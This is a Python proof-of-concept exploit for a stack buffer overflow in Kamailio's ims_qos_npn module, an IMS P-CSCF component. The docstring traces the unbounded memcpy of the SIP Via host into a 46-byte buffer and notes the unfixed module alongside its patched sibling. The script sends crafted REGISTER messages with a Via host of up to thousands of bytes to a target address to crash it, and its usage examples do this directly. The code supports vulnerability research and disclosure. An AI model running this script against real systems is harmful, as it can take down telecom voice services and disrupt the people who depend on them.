#!/usr/bin/env python3
"""
PoC -- Kamailio ims_qos_npn: stack buffer overflow in w_rx_aar_register()

Sink (Kamailio master f8e85fd42b, src/modules/ims_qos_npn/ims_qos_mod.c):

    1541:  char buff[IP_ADDR_MAX_STR_SIZE];                     /* 46 bytes  */
    1542:  if(_imsqos_params.recv_mode == 0 && !trust_bottom_via) {
    1543:      ...safe branch: uses msg->rcv.src_ip...
    1549:  } else {
    1556:      } else {
    1557:          // IPv4
    1558:          memcpy(&buff, vb->host.s, vb->host.len);      /* NO BOUND  */
    1559:          buff[vb->host.len] = 0;                       /* NO BOUND  */
    1560:      }

`vb` is the top Via header of the inbound SIP message
(cscf_get_ue_via() -> cscf_get_first_via(), src/lib/ims/ims_getters.c:988-995),
so `vb->host.len` is fully attacker controlled.  The parallel module
src/modules/ims_qos/ims_qos_mod.c received the guard in upstream commit
af1ae1d1e0 ("ims_qos: Validate length before copying", 2026-04-17):

    1523:  if(vb->host.len >= sizeof(buff)) {
    1524:      LM_ERR("Via host too long for buffer (%d)\n", vb->host.len);
    1525:      goto error;
    1526:  }

That commit changed exactly one file (src/modules/ims_qos/ims_qos_mod.c, 4
insertions).  The ims_qos_npn fork was never fixed.

Reachability on a P-CSCF:
  SIP REGISTER -> route[REGISTER] (route/register.cfg)
               -> #!ifdef WITH_RX  Rx_AAR_Register("REG_AAR_REPLY","pcscf_location")
               -> cfg_rx_aar_register() -> w_rx_aar_register()
               -> else-branch taken when recv_mode != 0 (docker_open5gs ships
                  modparam("ims_qos","recv_mode",1) in kamailio_pcscf.cfg:438)
               -> memcpy(&buff, vb->host.s, vb->host.len)

Usage:
  # crash the P-CSCF with a 2000-byte Via host
  ./poc_register_via_overflow.py --target 172.22.0.21 --port 5060 --via-len 2000

  # benign control (Via host fits in buff[46])
  ./poc_register_via_overflow.py --target 172.22.0.21 --port 5060 --via-len 15 --count 200
"""

import argparse
import random
import socket
import string
import sys
import time

DEFAULT_DOMAIN = "ims.mnc009.mcc460.3gppnetwork.org"
DEFAULT_IMPI = "001010123456789"


def rand_token(n):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def build_register(args, via_host, seq):
    """Build a syntactically valid SIP REGISTER whose top Via host is `via_host`."""
    branch = "z9hG4bK-%s" % rand_token(16)
    tag = rand_token(8)
    call_id = "%s@%s" % (rand_token(24), args.client_ip)
    cseq = 1000 + seq

    contact_uri = "sip:%s@%s:%d" % (args.impi, args.client_ip, args.client_port)
    lines = [
        "REGISTER sip:%s SIP/2.0" % args.domain,
        "Via: SIP/2.0/UDP %s:%d;branch=%s;rport" % (via_host, args.client_port, branch),
        "Max-Forwards: 70",
        "From: <sip:%s@%s>;tag=%s" % (args.impi, args.domain, tag),
        "To: <sip:%s@%s>" % (args.impi, args.domain),
        "Call-ID: %s" % call_id,
        "CSeq: %d REGISTER" % cseq,
        "Contact: <%s>;expires=%d;+sip.instance=\"<urn:uuid:%s>\""
        % (contact_uri, args.expires, rand_token(8) + "-" + rand_token(4)),
        "User-Agent: PoC-ims_qos_npn/1.0",
        "Allow: REGISTER,INVITE,ACK,CANCEL,BYE,OPTIONS,INFO,PRACK,UPDATE,SUBSCRIBE,NOTIFY",
        "Content-Length: 0",
        "",
        "",
    ]
    return ("\r\n".join(lines)).encode("ascii", errors="replace")


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--target", required=True, help="P-CSCF IP address")
    p.add_argument("--port", type=int, default=5060, help="P-CSCF SIP port (default 5060)")
    p.add_argument("--via-len", type=int, default=2000,
                   help="length of the Via host field in bytes; buff[] is 46 bytes, "
                        "so anything >= 46 overflows (default 2000)")
    p.add_argument("--via-char", default="A", help="fill character for the Via host")
    p.add_argument("--ipv6-brackets", action="store_true",
                   help="wrap the Via host in [] so the IPv6 branch (:1554) is taken")
    p.add_argument("--count", type=int, default=1, help="number of REGISTERs to send")
    p.add_argument("--interval", type=float, default=0.3, help="seconds between sends")
    p.add_argument("--timeout", type=float, default=2.0, help="recv timeout per send")
    p.add_argument("--client-ip", default="172.22.0.99",
                   help="source IP advertised in Contact/Call-ID (does not need to be ours)")
    p.add_argument("--client-port", type=int, default=5060, help="advertised client port")
    p.add_argument("--domain", default=DEFAULT_DOMAIN, help="IMS home domain")
    p.add_argument("--impi", default=DEFAULT_IMPI, help="IMPU/IMPI user part")
    p.add_argument("--expires", type=int, default=3600,
                   help="Contact expires; must be non-zero or Rx_AAR_Register returns early")
    p.add_argument("--dry-run", action="store_true", help="print the first message and exit")
    args = p.parse_args()

    via_host = args.via_char * args.via_len
    if args.ipv6_brackets:
        via_host = "[%s]" % via_host

    if args.dry_run:
        msg = build_register(args, via_host, 0)
        sys.stderr.write("=== message length: %d bytes, Via host length: %d ===\n"
                         % (len(msg), args.via_len))
        head = msg.split(b"\r\n")
        for i, h in enumerate(head):
            if i == 1:
                sys.stderr.write("Via: SIP/2.0/UDP <%d x '%s'>:%d;branch=...;rport\n"
                                 % (args.via_len, args.via_char, args.client_port))
            else:
                sys.stderr.write(h.decode("ascii", "replace") + "\n")
        return 0

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 0))
    sock.settimeout(args.timeout)
    # our real source port, used in the Via/Contact so replies come back to us
    args.client_port = sock.getsockname()[1]

    print("[*] target       = %s:%d/udp" % (args.target, args.port))
    print("[*] via host len = %d  (buffer is IP_ADDR_MAX_STR_SIZE = 46)" % args.via_len)
    print("[*] overflow     = %d bytes past end of buff[]" % max(0, args.via_len - 45))
    print("[*] sending %d REGISTER(s), %.2fs apart" % (args.count, args.interval))

    replies = 0
    for seq in range(args.count):
        msg = build_register(args, via_host, seq)
        t0 = time.time()
        try:
            sock.sendto(msg, (args.target, args.port))
        except OSError as e:
            print("[!] sendto failed on seq %d: %s" % (seq, e))
            break
        try:
            data, addr = sock.recvfrom(65535)
            replies += 1
            first = data.split(b"\r\n", 1)[0].decode("ascii", "replace")
            print("[+] seq %-5d reply from %s:%d -> %s" % (seq, addr[0], addr[1], first))
        except socket.timeout:
            print("[-] seq %-5d NO REPLY after %.2fs (target may have crashed)"
                  % (seq, time.time() - t0))
        if args.interval:
            time.sleep(args.interval)

    print("[*] done: %d sent, %d replies received" % (args.count, replies))
    return 0


if __name__ == "__main__":
    sys.exit(main())
